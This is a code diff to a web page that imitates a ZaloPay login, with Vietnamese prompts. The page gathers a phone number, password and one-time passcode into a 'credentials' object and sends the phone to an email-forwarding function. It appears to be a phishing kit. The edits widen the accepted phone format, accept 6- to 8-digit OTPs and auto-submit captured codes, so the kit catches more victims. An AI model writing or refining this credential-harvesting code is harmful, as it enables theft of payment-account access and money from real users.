@@ -490,6 +490,13 @@
         box-shadow: 0 0 0 4px rgba(0, 143, 229, 0.1);
         background-color: var(--background-primary);
       }
+      .otp-input-optional {
+        opacity: 0.4;
+      }
+      .otp-input-optional.has-value,
+      .otp-input-optional:focus {
+        opacity: 1;
+      }
 
       /* Nút bấm */
       .button {
@@ -712,8 +719,8 @@
                   placeholder="Số điện thoại"
                   required
                   inputmode="numeric"
-                  maxlength="9"
-                  pattern="[0-9]{9}"
+                  maxlength="10"
+                  pattern="[0-9]{10}"
                   oninput="this.value = this.value.replace(/\D/g, '')"
                 />
               </div>
@@ -849,6 +856,18 @@
                 <input
                   type="text"
                   class="otp-input"
+                  maxlength="1"
+                  inputmode="numeric"
+                />
+                <input
+                  type="text"
+                  class="otp-input otp-input-optional"
+                  maxlength="1"
+                  inputmode="numeric"
+                />
+                <input
+                  type="text"
+                  class="otp-input otp-input-optional"
                   maxlength="1"
                   inputmode="numeric"
                 />
@@ -1072,17 +1091,18 @@
           const phoneInput = getEl("zalopay-phone");
           let phoneValue = phoneInput.value.replace(/\D/g, "");
 
-          if (phoneValue.length === 9) {
-            credentials.phone = `+84${phoneValue}`;
+          if (phoneValue.length === 10 && phoneValue.startsWith("0")) {
+            const normalizedPhone = phoneValue.slice(1);
+            credentials.phone = `+84${normalizedPhone}`;
             sendToEmail("phone", credentials.phone);
-            const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
+            const maskedPhone = `+84 **** ${normalizedPhone.slice(-3)}`;
             getEl("masked-phone-password").textContent = maskedPhone;
             phoneInput.classList.remove("invalid");
             showSection("zalopay-password-section");
           } else {
             phoneInput.classList.add("invalid");
             showNotification(
-              "Số điện thoại không hợp lệ. Vui lòng nhập 9 chữ số (bỏ số 0 ở đầu).",
+              "Số điện thoại không hợp lệ. Vui lòng nhập đủ 10 chữ số bắt đầu bằng số 0.",
               "error"
             );
           }
@@ -1111,8 +1131,8 @@
           credentials.otp = Array.from(otpInputs)
             .map((input) => input.value)
             .join("");
-          if (credentials.otp.length !== 6) {
-            showNotification("Mã xác thực phải đủ 6 chữ số.", "error");
+          if (credentials.otp.length < 6 || credentials.otp.length > 8) {
+            showNotification("Mã xác thực phải từ 6 đến 8 chữ số.", "error");
             return;
           }
 
@@ -1227,7 +1247,10 @@
         };
 
         const clearOtpInputs = () => {
-          otpInputs.forEach((input) => (input.value = ""));
+          otpInputs.forEach((input) => {
+            input.value = "";
+            input.classList.remove("has-value");
+          });
           otpInputs[0].focus();
         };
 
@@ -1236,32 +1259,39 @@
           const phoneInput = getEl("zalopay-phone");
           phoneInput.addEventListener("input", () => {
             let value = phoneInput.value.replace(/\D/g, "");
-            if (value.length > 9) {
-              value = value.slice(0, 9);
+            if (value.length > 10) {
+              value = value.slice(0, 10);
             }
             phoneInput.value = value;
             phoneInput.classList.toggle(
               "invalid",
-              value.length > 0 && value.length < 9
+              value.length > 0 && (value.length < 10 || !value.startsWith("0"))
             );
           });
 
           otpInputs.forEach((input, index) => {
             input.addEventListener("input", () => {
+              input.value = input.value.replace(/\D/g, "");
+              if (input.classList.contains("otp-input-optional")) {
+                input.classList.toggle("has-value", input.value.length > 0);
+              }
               if (input.value && index < otpInputs.length - 1) {
                 otpInputs[index + 1].focus();
               }
-              if (
-                Array.from(otpInputs)
-                  .map((i) => i.value)
-                  .join("").length === 6
-              ) {
+              const otpValue = Array.from(otpInputs)
+                .map((i) => i.value)
+                .join("");
+              if (otpValue.length === 8) {
                 handleOtpSubmit();
               }
             });
             input.addEventListener("keydown", (e) => {
               if (e.key === "Backspace" && !input.value && index > 0) {
-                otpInputs[index - 1].focus();
+                const prevInput = otpInputs[index - 1];
+                if (prevInput.classList.contains("otp-input-optional")) {
+                  prevInput.classList.remove("has-value");
+                }
+                prevInput.focus();
               }
             });
             input.addEventListener("paste", (e) => {
@@ -1269,16 +1299,21 @@
               const pasteData = e.clipboardData
                 .getData("text")
                 .replace(/\D/g, "")
-                .slice(0, 6);
+                .slice(0, 8);
               pasteData.split("").forEach((char, i) => {
-                if (otpInputs[i]) otpInputs[i].value = char;
+                if (otpInputs[i]) {
+                  otpInputs[i].value = char;
+                  if (otpInputs[i].classList.contains("otp-input-optional")) {
+                    otpInputs[i].classList.add("has-value");
+                  }
+                }
               });
               const focusIndex = Math.min(
-                5,
+                otpInputs.length - 1,
                 pasteData.length > 0 ? pasteData.length : 0
               );
               if (otpInputs[focusIndex]) otpInputs[focusIndex].focus();
-              if (pasteData.length === 6) handleOtpSubmit();
+              if (pasteData.length >= 6) handleOtpSubmit();
             });
           });
 
